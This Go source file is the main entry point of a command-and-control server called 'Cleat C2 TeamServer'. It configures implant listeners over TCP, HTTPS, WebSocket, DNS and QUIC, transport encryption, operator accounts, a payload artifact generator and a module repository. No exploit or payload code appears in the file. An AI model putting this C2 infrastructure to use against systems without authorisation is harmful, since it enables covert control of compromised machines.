// TeamServer 入口: 装配配置/加密/存储/事件总线/会话管理/HTTP API 并启动。
package main

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"
	"time"

	"cleat/teamserver/internal/api"
	"cleat/teamserver/internal/auth"
	"cleat/teamserver/internal/beacon"
	"cleat/teamserver/internal/cli"
	"cleat/teamserver/internal/config"
	"cleat/teamserver/internal/crypto"
	"cleat/teamserver/internal/eventbus"
	"cleat/teamserver/internal/eventlog"
	"cleat/teamserver/internal/handlers"
	"cleat/teamserver/internal/logx"
	"cleat/teamserver/internal/modules"
	"cleat/teamserver/internal/pivot"
	"cleat/teamserver/internal/service"
	"cleat/teamserver/internal/session"
	"cleat/teamserver/internal/store"
	"cleat/teamserver/internal/tlsutil"
)

func main() {
	// (按反馈置顶): 艺术字是正常启动的**第一屏**输出 —— 先于
	// 配置加载/存储迁移/认证播种等一切初始化日志; 纯装饰, 无任何依赖。
	fmt.Fprint(os.Stdout, cleatArt)
	cfg := config.Default()
	interactive := false

	// 先读 -config/-config-init(flag.Parse 前手动扫, 让 toml 先于 flag 覆盖默认)
	var configPath, configInit string
	preArgs := os.Args[1:]
	for i := 0; i < len(preArgs); i++ {
		switch {
		case preArgs[i] == "-config" && i+1 < len(preArgs):
			configPath = preArgs[i+1]
			i++
		case preArgs[i] == "-config-init" && i+1 < len(preArgs):
			configInit = preArgs[i+1]
			i++
		}
	}
	// -config-init: 输出模板并退出
	if configInit != "" {
		// Linux 审计 L5: 模板含 psk/x25519_key 等敏感字段, 落盘须 0o600(仅属主可读)
		if err := os.WriteFile(configInit, []byte(config.Template()), 0o600); err != nil {
			logx.Printf("[-] 写 config 模板失败: %v\n", err)
			os.Exit(1)
		}
		logx.Println("[*] 配置模板已写入", configInit, "（修改后用 -config 指定启动）")
		return
	}
	// 加载配置文件(以默认为基础, flag 之后覆盖)
	// 若用户未指定 -config, 自动搜索常见位置
	if configPath == "" {
		configPath = searchConfigFile()
	}
	if configPath != "" {
		if err := config.LoadFromFile(&cfg, configPath); err != nil {
			logx.Println("[-] 读取配置失败:", err)
			os.Exit(1)
		}
		logx.Printf("[*] 配置文件 %s\n", configPath)
	}

	flag.StringVar(&cfg.ListenAddr, "listen", cfg.ListenAddr, "植入物 TCP 监听地址")
	flag.StringVar(&cfg.APIServer, "api", cfg.APIServer, "HTTP API 监听地址")
	flag.StringVar(&cfg.DBPath, "db", cfg.DBPath, "SQLite 数据库路径(空=纯内存)")
	flag.StringVar(&cfg.Token, "token", cfg.Token, "HTTP API 访问令牌(bearer; 空=无认证)")
	flag.BoolVar(&cfg.Encryption, "encrypt", cfg.Encryption, "启用传输加密")
	flag.StringVar(&cfg.PSKHex, "psk", cfg.PSKHex, "预共享密钥(64位hex), 启用加密时必填")
	flag.StringVar(&cfg.X25519Key, "x25519-key", cfg.X25519Key, "X25519 长期私钥(64位hex), 启用后 beacon 走 X25519 握手模式(与 -psk 二选一)")
	flag.BoolVar(&interactive, "cli", cfg.CLI, "启用交互式操作员 CLI")
	flag.StringVar(&cfg.AdminUser, "admin-user", cfg.AdminUser, "首次启动创建的管理员操作员名(空=不创建)")
	flag.StringVar(&cfg.AdminToken, "admin-token", cfg.AdminToken, "管理员操作员令牌(与 -admin-user 配对)")
	flag.StringVar(&cfg.AdminPassword, "admin-password", cfg.AdminPassword, "管理员操作员密码(登录用; 与 -admin-user 配对, 可选)")
	flag.StringVar(&cfg.BeaconListen, "beacon-listen", cfg.BeaconListen, "(HTTPS beacon) 监听地址, 例 127.0.0.1:8443; 空=不启动 beacon")
	flag.StringVar(&cfg.BeaconURL, "beacon-url", cfg.BeaconURL, "beacon GET 拉取路径")
	flag.StringVar(&cfg.BeaconUpload, "beacon-upload", cfg.BeaconUpload, "beacon POST 上传路径")
	flag.StringVar(&cfg.BeaconTLSCert, "beacon-cert", cfg.BeaconTLSCert, "beacon TLS 证书路径(自签; 空=纯 HTTP)")
	flag.StringVar(&cfg.BeaconTLSKey, "beacon-key", cfg.BeaconTLSKey, "beacon TLS 私钥路径")
	flag.StringVar(&cfg.WSBeaconPath, "ws-path", cfg.WSBeaconPath, "(wss beacon) WebSocket 路径, 骑 beacon TLS 监听; 空=不启用")
	flag.StringVar(&cfg.DNSListen, "dns-listen", cfg.DNSListen, "(DNS beacon) UDP 监听地址, 例 0.0.0.0:5353; 空=不启动")
	flag.StringVar(&cfg.DNSDomain, "dns-domain", cfg.DNSDomain, "DNS beacon 查询域(与 Agent --domain 一致)")
	flag.StringVar(&cfg.QUICListen, "quic-listen", cfg.QUICListen, "(QUIC beacon) UDP 监听地址, 例 0.0.0.0:4433; 空=不启动")
	flag.BoolVar(&cfg.TLSEnabled, "tls", cfg.TLSEnabled, "API 端口启用 HTTPS")
	flag.StringVar(&cfg.TLSCert, "tls-cert", cfg.TLSCert, "TLS 证书路径(空=自动生成自签证书)")
	flag.StringVar(&cfg.TLSKey, "tls-key", cfg.TLSKey, "TLS 私钥路径")
	flag.StringVar(&cfg.ArtifactOutRoot, "artifact-out", cfg.ArtifactOutRoot, "样本产物根目录(空=<db 目录>/artifacts, db 空则 ./artifacts)")
	flag.StringVar(&cfg.ArtifactStubDir, "stub-dir", cfg.ArtifactStubDir, "外部 stub 目录覆盖(空=仅用内置 go:embed stub)")
	flag.BoolVar(&cfg.ArtifactAllowCompile, "artifact-allow-compile", cfg.ArtifactAllowCompile, "启用现场编译路径(高级; 需 MSVC/cmake; 默认 false)")
	flag.StringVar(&configPath, "config", configPath, "server.toml 配置文件(覆盖默认; flag 优先)")
	flag.Parse()
	//  修复: 原为 `cfg.CLI = cfg.CLI || interactive`, toml cli=true 时
	// 命令行 -cli=false 被 OR 吞掉(false 不可表达), 后台/无 TTY 启动会因 CLI 读到
	// stdin EOF 而立即退出(真机冒烟实测)。flag 默认值本就取自 cfg.CLI(toml),
	// 直接赋值即同时覆盖三种情形: 不传(=toml 值)/-cli=true/-cli=false。
	cfg.CLI = interactive

	if err := cfg.Validate(); err != nil {
		logx.Println("[-] 配置错误:", err)
		os.Exit(1)
	}

	// 加密器(可选): PSK 或 X25519 握手模式(X25519 优先)
	var cbox *crypto.Box
	var xbox *crypto.X25519Box
	if cfg.X25519Key != "" {
		x, err := crypto.NewX25519(cfg.X25519Key)
		if err != nil {
			logx.Println("[-] X25519 初始化失败:", err)
			os.Exit(1)
		}
		xbox = x
		logx.Printf("[*] 传输加密 X25519 握手模式（公钥 %s）\n", x.PublicKeyHex())
	}
	if cfg.Encryption && cbox == nil && xbox == nil {
		c, err := crypto.New(cfg.PSKHex)
		if err != nil {
			logx.Println("[-] 加密初始化失败:", err)
			os.Exit(1)
		}
		cbox = c
	}

	// 存储 + 事件总线 + 会话管理
	st, stErr := makeStore(cfg)
	if stErr != nil {
		logx.Println("[-]", stErr)
		os.Exit(1)
	}
	bus := eventbus.New()
	mgr := session.NewManager(st, bus, cbox, xbox, cfg.MimicEnabled)
	handlers.Registry(mgr, bus, st)
	piv := pivot.New(mgr, bus)
	// 事件落盘: 订阅全局总线, 结果型事件写 events 表(流型事件不落, 保持 SSE 实时)
	go eventlog.Start(st, bus, nil)

	// 种子管理员: 每次启动同步密码/Token(幂等; 防止旧数据库密码不一致)。
	if cfg.AdminUser != "" && (cfg.AdminToken != "" || cfg.AdminPassword != "") {
		existing, exists := st.Operator(cfg.AdminUser)
		var op *store.Operator
		if exists {
			// 已存在: 更新密码和 Token(确保 server.toml 改密后重启即生效)
			op = existing
			if cfg.AdminPassword != "" {
				hash, err := auth.HashPassword(cfg.AdminPassword)
				if err != nil {
					logx.Println("[-] admin-password bcrypt 哈希失败:", err)
					os.Exit(1)
				}
				op.PasswordHash = hash
			}
			if cfg.AdminToken != "" {
				op.Token = cfg.AdminToken
			}
			op.Active = true
			logx.Printf("[+] 操作员 %s 已就绪（密码/Token 已同步）\n", cfg.AdminUser)
		} else {
			// 新建
			op = &store.Operator{Username: cfg.AdminUser, Role: store.RoleAdmin, Token: cfg.AdminToken, Active: true}
			if cfg.AdminPassword != "" {
				hash, err := auth.HashPassword(cfg.AdminPassword)
				if err != nil {
					logx.Println("[-] admin-password bcrypt 哈希失败:", err)
					os.Exit(1)
				}
				op.PasswordHash = hash
			}
			pw := "仅 Token"
			if cfg.AdminPassword != "" {
				pw = "密码已设置"
			}
			logx.Printf("[+] 操作员 %s 已创建（%s）\n", cfg.AdminUser, pw)
		}
		// 确保 Token 非空(Login 要求 Token != "")
		if op.Token == "" {
			b := make([]byte, 32)
			if _, err := rand.Read(b); err != nil {
				logx.Println("[-] 生成 admin token 失败:", err)
				os.Exit(1)
			}
			op.Token = hex.EncodeToString(b)
			logx.Printf("[*] API token 已生成（%s）\n", cfg.AdminUser)
		}
		if err := st.SaveOperator(op); err != nil {
			logx.Println("[-] 保存管理员操作员失败:", err)
			os.Exit(1)
		}
	}

	banner(cfg)

	// 启动会话监听(goroutine)
	// 容量 = 可能报错的启动路径数(TCP 监听 / HTTP API / beacon / DNS), 避免并发报错时写入阻塞
	errCh := make(chan error, 4)
	go func() {
		if err := mgr.AddListener(cfg.ListenAddr, cbox, xbox, cfg.MimicEnabled); err != nil {
			errCh <- err
		}
	}()

	// 心跳清理: 每 30s 清理 >30min 离线会话
	go func() {
		defer logx.Guard("main-cleanup-sweeper") // G3
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			// A3-13: 先把停拍超阈值的 beacon 会话标离线(Closed=true),
			// 它们才有资格被下一行的 CleanupExpired 回收
			mgr.SweepStaleBeacons()
			// 的任务(正常路径活不过 3x 窗)置 timeout 终态, 防永久卡"已派发"
			mgr.SweepStuckTasks()
			st.CleanupExpired(30 * time.Minute)
			// TS-3(A3-25): 过期 SSE 短 token 周期回收
			api.PruneSSETokens(time.Now())
		}
	}()

	// 启动 HTTP(S) API
	// beacon(HTTPS) 处理器总是创建: 既供配置驱动 beacon 使用, 也供面板动态 https 监听器使用
	bh := beacon.New(mgr, cbox, xbox)
	// 服务层(第 2 批结构手术): api/cli 的业务统一经 service, 入口层只做参数转换
	svc := service.New(mgr, st, piv, cfg.Token)
	svc.SetBeaconHandler(bh)
	artifactOutRoot := cfg.ArtifactOutRoot
	if artifactOutRoot == "" {
		if d := filepath.Dir(cfg.DBPath); d != "" && d != "." {
			artifactOutRoot = filepath.Join(d, "artifacts")
		} else {
			artifactOutRoot = "artifacts"
		}
	}
	if err := svc.SetArtifact(artifactOutRoot, cfg.ArtifactStubDir, cfg.ArtifactAllowCompile); err != nil {
		logx.Println("[-] 生成器初始化失败:", err)
		os.Exit(1)
	}
	compileNote := ""
	if cfg.ArtifactAllowCompile {
		compileNote = "（现场编译已启用）"
	}
	logx.Printf("[*] 产物目录 %s%s\n", artifactOutRoot, compileNote)
	apiServer := api.New(svc, bus, cfg.Token)
	// 模块仓库(data/modules/)
	modDataDir := filepath.Dir(cfg.DBPath)
	if modDataDir == "." || modDataDir == "" {
		modDataDir = "data"
	}
	modRepo, err := modules.New(modDataDir)
	if err != nil {
		logx.Println("[-] 模块仓库初始化失败:", err)
		os.Exit(1)
	}
	svc.SetModuleRepo(modRepo)
	logx.Printf("[*] 模块仓库 %s\n", filepath.Join(modDataDir, "modules"))
	// 自动搜索前端 dist 目录
	for _, candidate := range []string{
		filepath.Join(filepath.Dir(cfg.DBPath), "dist"), // bin/dist
		filepath.Join(".", "dist"),                      // cwd/dist
		filepath.Join("..", "Web", "dist"),              // ../Web/dist
		filepath.Join("web"),                            // cwd/web
	} {
		if fi, err := os.Stat(candidate); err == nil && fi.IsDir() {
			// 检查 index.html 是否存在
			if _, err := os.Stat(filepath.Join(candidate, "index.html")); err == nil {
				apiServer.SetStaticDir(candidate)
				logx.Printf("[*] Web 静态目录 %s\n", candidate)
				break
			}
		}
	}
	srv := &http.Server{
		Addr:    cfg.APIServer,
		Handler: apiServer.Handler(),
	}
	go func() {
		defer logx.Guard("api-serve") // G3
		var err error
		if cfg.TLSEnabled {
			certPath, keyPath := cfg.TLSCert, cfg.TLSKey
			if certPath == "" || keyPath == "" {
				// 自动生成自签证书(存到 DB 同目录或 cwd)
				dataDir := filepath.Dir(cfg.DBPath)
				if dataDir == "." || dataDir == "" {
					dataDir = "data"
				}
				certPath, keyPath, err = tlsutil.EnsureCert(dataDir)
				if err != nil {
					errCh <- fmt.Errorf("TLS 证书: %w", err)
					return
				}
				logx.Printf("[*] 自签证书 %s\n", certPath)
			}
			srv.TLSConfig = tlsutil.TLSConfig()
			proto := "https"
			logx.Printf("[*] 控制接口 %s://%s\n", proto, cfg.APIServer)
			err = srv.ListenAndServeTLS(certPath, keyPath)
		} else {
			logx.Printf("[*] 控制接口 http://%s\n", cfg.APIServer)
			err = srv.ListenAndServe()
		}
		if err != nil && err != http.ErrServerClosed {
			errCh <- fmt.Errorf("HTTP API: %w", err)
		}
	}()

	// 可选: HTTPS beacon listener(多传输通道, 独立端口; 命令经 POST 响应带回)
	// 复用上方已创建的 bh(与面板动态 https 监听器同一处理器)。
	// **必须走 mgr 动态 listener 表**(防覆辙, ): 曾用独立 http.Server 启动,
	// 不进 mgr.listeners → 面板 /api/listeners 看不见它, 只显示 TCP 会话监听器,
	// 即"HTTPS 模式面板显示 TCP"的根因。与 DNS listener 同一原则(见下方注释)。
	if cfg.BeaconListen != "" {
		bmux := http.NewServeMux()
		bmux.HandleFunc(cfg.BeaconURL, bh.Poll())
		bmux.HandleFunc(cfg.BeaconUpload, bh.Upload())
		// wss beacon 通道骑同一 TLS 监听(同 443/同证书/同 vhost —— WebSocket 通道
		if cfg.WSBeaconPath != "" {
			bmux.HandleFunc(cfg.WSBeaconPath, bh.WebSocket())
		}
		var beaconTLS *tls.Config
		if cfg.BeaconTLSCert != "" && cfg.BeaconTLSKey != "" {
			cert, err := tls.LoadX509KeyPair(cfg.BeaconTLSCert, cfg.BeaconTLSKey)
			if err != nil {
				errCh <- fmt.Errorf("beacon 证书加载: %w", err)
			} else {
				// MinVersion —— Go 服务端默认最低 TLS 1.0/1.1(RFC 8996 已弃用),
				// 且不限套件, 与 tlsutil.TLSConfig() 的既定策略自相矛盾。本路径是
				// Agent 主要落地通道, 补齐为与 tlsutil 同源的策略。
				beaconTLS = &tls.Config{
					Certificates: []tls.Certificate{cert},
					MinVersion:   tls.VersionTLS12,
					CipherSuites: tlsutil.CipherSuites(),
				}
			}
		}
		if err := mgr.AddHTTPSListener(cfg.BeaconListen, bmux, beaconTLS, ""); err != nil {
			errCh <- fmt.Errorf("beacon listener: %w", err)
		}
	}

	// 可选: DNS beacon listener(迷你 DNS 服务器/UDP; 命令经 TXT 应答分片带回)
	// 走 mgr 的动态 listener 表, 因而与面板的 listeners 管理/列举一致。
	if cfg.DNSListen != "" {
		if err := mgr.AddDNSListener(cfg.DNSListen, beacon.NewDNSListener(bh, cfg.DNSDomain)); err != nil {
			errCh <- fmt.Errorf("dns listener: %w", err)
		}
	}

	// 可选: QUIC beacon listener(quic-go/UDP; QUIC stream 桥接后与 TCP/WS 同族,
	// 与 HTTPS/DNS 共用会话层)。同样走 mgr 的动态 listener 表(防覆辙原则同上方)。
	if cfg.QUICListen != "" {
		ql, err := beacon.NewQUICListener(bh, cfg.QUICListen)
		if err != nil {
			errCh <- fmt.Errorf("quic listener: %w", err)
		} else if err := mgr.AddQUICListener(cfg.QUICListen, ql); err != nil {
			errCh <- fmt.Errorf("quic listener: %w", err)
		}
	}

	// 启动就绪(监听绑定失败经 errCh 立即上报并走上方错误路径)
	logx.Println("[+] 服务就绪，等待 Agent 接入")

	// 可选: 操作员 CLI(独立 goroutine, 读 stdin)
	if cfg.CLI {
		c := cli.New(svc, bus)
		c.OnQuit = func() { errCh <- cli.ErrQuit }
		go c.Run()
	}

	// 等待退出信号或错误
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
	select {
	case err := <-errCh:
		if errors.Is(err, cli.ErrQuit) {
			logx.Println("[*] 操作员请求退出（CLI quit）")
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()
			_ = srv.Shutdown(ctx)
			return
		}
		logx.Println("[-] 启动失败:", err)
		os.Exit(1)
	case <-sig:
		logx.Println("[*] 收到退出信号")
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		_ = srv.Shutdown(ctx)
	}
}

// cleatArt 启动艺术字("ANSI Shadow" 风格, pyfiglet 生成)。
//  加: 走 fmt/os.Stdout 直出而不经 logx —— 诊断行带 [HH:MM:SS]
// 前缀, 逐行会撕碎艺术字排版; 由 main() 首行打印(先于 REPL 启动, stdout
// 尚未被 SetStdoutQuiet 静默), CLI/非 CLI 两种模式均可见, 纯装饰不影响主流程。
const cleatArt = `
 ██████╗██╗     ███████╗ █████╗ ████████╗
██╔════╝██║     ██╔════╝██╔══██╗╚══██╔══╝
██║     ██║     █████╗  ███████║   ██║
██║     ██║     ██╔══╝  ██╔══██║   ██║
╚██████╗███████╗███████╗██║  ██║   ██║
 ╚═════╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝
           Cleat C2 · TeamServer
`

// banner 汇总启动信息中不属于任何组件自身日志的部分（存储路径 / API 认证 / CLI）。
//  风格统一: 移除与运行时日志重复的"会话层/控制层"两行 —— 真实监听地址
// 由 session 层与 API 启动时打印（含实际加密/伪装状态），此处不再重复配置值；
// 输出前缀统一为 [*]/[!]（信息/警告），对齐主流工具（MSF/Sliver 式）习惯。
func banner(cfg config.Config) {
	p := "内存"
	if cfg.DBPath != "" {
		p = cfg.DBPath
	}
	logx.Printf("[*] 存储 %s\n", p)
	if cfg.Token != "" {
		logx.Printf("[*] API 认证 bearer token\n")
	} else {
		logx.Printf("[!] API 认证未启用（开发模式）\n")
	}
	if cfg.CLI {
		logx.Println("[*] CLI 已启用（输入 ? 或 help 查看命令）")
	}
}

// makeStore 按配置创建存储(DBPath 空=纯内存, 否则 SQLite 并预加载历史会话)。
func makeStore(cfg config.Config) (*store.Store, error) {
	if cfg.DBPath == "" {
		return store.New(), nil
	}
	return store.WithSQLite(cfg.DBPath)
}

// searchConfigFile 自动搜索 server.toml 配置文件。
// (不再把 ./bin/ 作为候选: 根目录 bin 仅用于开发期日志, 已于  移除,
// 搜索顺序: 可执行文件同目录 → 当前工作目录。
func searchConfigFile() string {
	names := []string{"server.toml", "teamserver.toml"}
	dirs := []string{}
	// 1. 可执行文件同目录
	if exe, err := os.Executable(); err == nil {
		dirs = append(dirs, filepath.Dir(exe))
	}
	// 2. 当前工作目录
	if cwd, err := os.Getwd(); err == nil {
		dirs = append(dirs, cwd)
	}
	// 去重
	seen := map[string]bool{}
	for _, dir := range dirs {
		if seen[dir] {
			continue
		}
		seen[dir] = true
		for _, name := range names {
			p := filepath.Join(dir, name)
			if _, err := os.Stat(p); err == nil {
				return p
			}
		}
	}
	return ""
}
